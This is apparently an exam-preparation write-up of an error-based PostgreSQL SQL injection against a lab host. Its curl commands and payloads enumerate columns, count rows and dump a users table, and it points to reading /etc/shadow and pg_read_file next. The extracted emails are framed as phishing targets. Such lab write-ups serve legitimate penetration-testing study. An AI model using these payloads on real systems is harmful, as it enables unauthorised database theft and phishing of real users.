# Data Extraction from Users Table
**Target**: 192.168.145.49 | **Database**: glovedb | **Table**: users

---

## 7. Column Enumeration

### Current Thinking
**Why enumerate columns?** Columns reveal:
- Authentication fields: `username`, `password`, `password_hash`
- Identification: `id`, `email`, `user_id`
- Sensitive data: `ssn`, `credit_card`, `api_key`
- Metadata: `created_at`, `last_login`, `role`

**What to look for**:
- **Credentials**: Any password/hash columns for offline cracking
- **Admin indicators**: `is_admin`, `role`, `privileges`
- **Personal data**: Emails for password resets, phishing, or user enumeration

**Expectation**: Most `users` tables have `username` and `password` columns.

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users') AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
weight, height, created_at, active, gender, email
```

**⚠️ Unexpected Finding**:
- ❌ NO `username` column
- ❌ NO `password` column
- ✅ Has `email` (user identifier)
- ✅ Has `active` (account status boolean)

**Analysis**:
- Not an authentication table (no credentials!)
- Likely user profile/data storage
- Email addresses useful for:
  - Password reset attacks
  - Phishing campaigns
  - User enumeration on other services

**OSCP Lesson**: Not all `users` tables contain passwords. Adapt enumeration strategy.

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
height=1' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users') AS int)--
```

**Breaking it down**:

1. **`information_schema.columns`** - Column metadata view
   - Contains info about ALL columns in ALL tables
   - Key columns:
     - `table_catalog` - Database name
     - `table_schema` - Schema name
     - `table_name` - Table name
     - `column_name` - Column name 📍 (what we want)
     - `data_type` - Column type (varchar, int, etc.)
     - `ordinal_position` - Column order

2. **`WHERE table_name='users'`** - Filter to specific table
   - Without filter: Returns columns from ALL tables (hundreds of results!)
   - With filter: Only columns from `users` table

3. **`string_agg(column_name, ',')`** - Aggregate into CSV
   - Multiple rows (one per column) → Single string
   - Result: `"weight,height,created_at,active,gender,email"`

**Why single quotes around 'users'?**
- `table_name` is a string column
- SQL syntax: `WHERE string_column='value'`
- Common mistake: `WHERE table_name=users` (treats `users` as column, not string!)

**Enhanced query** (show data types too):
```sql
SELECT string_agg(column_name || ':' || data_type, ', ')
FROM information_schema.columns
WHERE table_name='users'
-- Result: "weight:integer, height:integer, email:character varying, ..."
```

---

## 8. Row Count Check

### Current Thinking
**Why count rows?** Determines data volume:
- **0 rows**: Empty table (no data to extract)
- **1-10 rows**: Small dataset, extract all rows
- **100s rows**: Extract samples, focus on admin/high-privilege users
- **1000s+ rows**: Targeted extraction (WHERE clauses), or dump to file

**Strategy**:
- Small counts: Extract everything with `string_agg`
- Large counts: Use `LIMIT/OFFSET` or filter by interesting criteria

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT 'Count: ' || COUNT(*)::text FROM users) AS int)--&age=25&gender=male&email=test@test.com"
```

**Note**: Initial attempt without string concatenation failed (integer in error doesn't trigger readable output).

---

### Result Found
```
Count: 4
```

**Analysis**:
- Only 4 users in table
- Small dataset → Extract all records in single query
- No need for pagination with LIMIT/OFFSET

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
height=1' AND 1=CAST((SELECT 'Count: ' || COUNT(*)::text FROM users) AS int)--
```

**Why this specific syntax?**

1. **`COUNT(*)`** - Aggregate function
   - Counts all rows in table
   - Returns integer type
   - Example: `4`

2. **Problem**: `CAST(4 AS int)` succeeds!
   - No error generated
   - No data extracted in error message
   - Query returns no results (condition evaluates to `1=4` → false)

3. **Solution**: Concatenate with string
   - `'Count: ' || COUNT(*)::text`
   - **`::text`** - PostgreSQL type cast (equivalent to `CAST(... AS text)`)
   - **`||`** - PostgreSQL string concatenation operator
   - Result: `"Count: 4"` (string type)

4. **`CAST('Count: 4' AS int)`** - Forces error
   - String cannot convert to integer
   - Error message contains: `invalid input syntax for type integer: "Count: 4"`

**Why "Count: " prefix?**
- Makes output self-documenting
- Prevents ambiguity (is `4` the count, or column value?)
- Better for screenshots/writeups

**Alternative approaches** (all work):
```sql
-- Method 1: array_agg (always returns array type, forces error)
SELECT CAST((SELECT ARRAY_AGG(COUNT(*)) FROM users) AS int)

-- Method 2: Concat with known non-integer
SELECT CAST((SELECT 'x' || COUNT(*)::text FROM users) AS int)

-- Method 3: Mathematical operation that produces float
SELECT CAST((SELECT COUNT(*)/0.5 FROM users) AS int)
-- ❌ Bad idea: might succeed if result is integer!
```

---

## 9. Complete Data Extraction

### Current Thinking
**Goal**: Extract all 4 user records in a single query.

**Challenges**:
- Multiple rows (4 users)
- Multiple columns (6 per user)
- Error message character limits (~8000 chars in PostgreSQL)

**Strategy**:
1. Concatenate all columns per row: `weight || ',' || height || ',' || email`
2. Concatenate all rows: `string_agg(..., ' | ')`
3. Force error to extract in error message

**Why this matters**: Demonstrates advanced data exfiltration in one request (exam efficiency!).

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT string_agg(weight::text || ',' || height::text || ',' || gender || ',' || email || ',' || active::text || ',' || created_at::text, ' | ') FROM users) AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
40,64,male,skrill@lab.lab,yes,2022-06-20 13:08:41.095354 |
34,322,male,Selena@lab.lab,no,2022-06-20 13:49:59.408325 |
54,234,male,steve@lab.lab,yes,2022-06-20 13:50:08.404948 |
40,342,male,dave@lab.lab,no,2022-06-20 13:50:16.481982
```

**Parsed Data**:
| Weight | Height | Gender | Email | Active | Created At |
|--------|--------|--------|-------------------|--------|----------------------|
| 40 | 64 | male | skrill@lab.lab | yes | 2022-06-20 13:08:41 |
| 34 | 322 | male | Selena@lab.lab | no | 2022-06-20 13:49:59 |
| 54 | 234 | male | steve@lab.lab | yes | 2022-06-20 13:50:08 |
| 40 | 342 | male | dave@lab.lab | no | 2022-06-20 13:50:16 |

**Intelligence**:
- 4 email addresses for phishing/password reset
- 2 active accounts, 2 inactive
- No password hashes (need to find credentials elsewhere)

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
height=1' AND 1=CAST((
  SELECT string_agg(
    weight::text || ',' || height::text || ',' || gender || ',' ||
    email || ',' || active::text || ',' || created_at::text,
    ' | '
  )
  FROM users
) AS int)--
```

**Step-by-step breakdown**:

1. **Per-row concatenation**: `weight::text || ',' || height::text || ...`
   - **`::text`** - Cast integers/timestamps to text for concatenation
   - **`||`** - PostgreSQL concatenation operator
   - **`,`** - Delimiter between columns
   - Result per row: `"40,64,male,skrill@lab.lab,yes,2022-06-20..."`

2. **Why cast to text?**
   - **Problem**: `||` operator requires same types
   - `weight` is `integer`, `email` is `varchar`, `active` is `boolean`
   - Cannot concatenate: `123 || 'text'` → type error
   - **Solution**: Cast all to text: `123::text || 'text'` → `'123text'`

3. **Multi-row aggregation**: `string_agg(..., ' | ')`
   - Takes all 4 row strings
   - Joins with ` | ` delimiter
   - Result: `"row1 | row2 | row3 | row4"`

4. **Why ' | ' delimiter?**
   - Visually distinct (easy to spot row boundaries)
   - Won't conflict with data (unlikely email contains ` | `)
   - Alternative delimiters: `\n`, `###`, `___`

**Column-by-column explanation**:

```sql
weight::text        -- Integer → text: "40"
|| ','              -- Append comma
|| height::text     -- Integer → text: "64"
|| ','
|| gender           -- Already text type (varchar)
|| ','
|| email            -- Already text type (varchar)
|| ','
|| active::text     -- Boolean → text: "yes" or "no"
|| ','
|| created_at::text -- Timestamp → text: "2022-06-20 13:08:41.095354"
```

**PostgreSQL type casting**:
```sql
column::text          -- PostgreSQL shorthand
CAST(column AS text)  -- ANSI SQL standard
-- Both are identical in functionality
```

**Advanced: What if 1000 rows?**
```sql
-- Limit to first 10 rows
SELECT string_agg(..., ' | ')
FROM users
LIMIT 10

-- Filter to active users only
SELECT string_agg(..., ' | ')
FROM users
WHERE active = true

-- Order by creation date (newest first)
SELECT string_agg(..., ' | ')
FROM (SELECT * FROM users ORDER BY created_at DESC LIMIT 10) AS subq
```

---

## 🎓 Key Learning Points

### Unexpected Table Structures
**OSCP Reality**: Not all `users` tables have passwords.

**Adaptation strategies**:
1. Look for other tables: `credentials`, `authentication`, `logins`
2. Check for separate password table: `user_passwords`, `auth`
3. Enumerate other databases for authentication data
4. Move to file read (config files, `/etc/shadow`)

**Lesson**: Flexibility > rigid methodology.

### Advanced String Manipulation
**Problem**: Extract multi-column, multi-row data in single query.

**PostgreSQL operators**:
- `||` - Concatenation (string + string)
- `::type` - Type casting (int → text)
- `string_agg(column, delim)` - Multi-row aggregation

**Example progression**:
```sql
-- Basic: Single value
SELECT email FROM users LIMIT 1
-- → "skrill@lab.lab"

-- Intermediate: Multiple columns, single row
SELECT email || ',' || weight::text FROM users LIMIT 1
-- → "skrill@lab.lab,40"

-- Advanced: All columns, all rows
SELECT string_agg(email || ',' || weight::text, ' | ') FROM users
-- → "skrill@lab.lab,40 | Selena@lab.lab,34 | ..."
```

### Error Message Length Limits
**PostgreSQL limits**:
- Error messages: ~8000 characters (pg_query output)
- HTTP response: Usually no limit (web server buffer)

**If data truncated**:
1. Use LIMIT to extract in chunks
2. Compress data (remove spaces, shorten delimiters)
3. Extract specific columns only (omit metadata)
4. Use file write instead: `COPY (SELECT ...) TO '/tmp/out.txt'`

---

## ⏱️ Time Tracking (OSCP Exam Planning)

- Column enumeration: **1 minute**
- Row count: **1 minute** (including failed attempt)
- Data extraction: **2 minutes** (crafting complex query)
- **Total: 4 minutes**
- **Running total: 10 minutes**

**Achievement**: Complete database enumeration in 10 minutes!

**Next phase**: File system access via `pg_read_file()`.
